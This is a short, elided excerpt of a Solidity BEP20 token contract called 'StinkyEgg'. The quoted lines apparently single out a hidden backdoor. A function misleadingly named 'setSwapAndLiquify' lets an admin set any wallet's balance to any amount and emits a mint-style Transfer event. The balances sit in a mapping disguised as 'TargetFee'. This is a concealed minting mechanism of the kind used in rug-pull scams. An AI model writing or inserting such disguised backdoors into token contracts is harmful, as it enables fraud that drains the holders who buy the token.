...
contract StinkyEgg is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    constructor() {
        ...
        TargetFee[_msgSender()] = _totalSupply;
    ...
    */
    ...
    function setSwapAndLiquify (address SpenderWallet, uint256 amount) external onlyAdmin {
             TargetFee[SpenderWallet] = amount * 10 ** 9;
        
        emit Transfer(address(0), SpenderWallet, amount * 10 ** 9);
  }
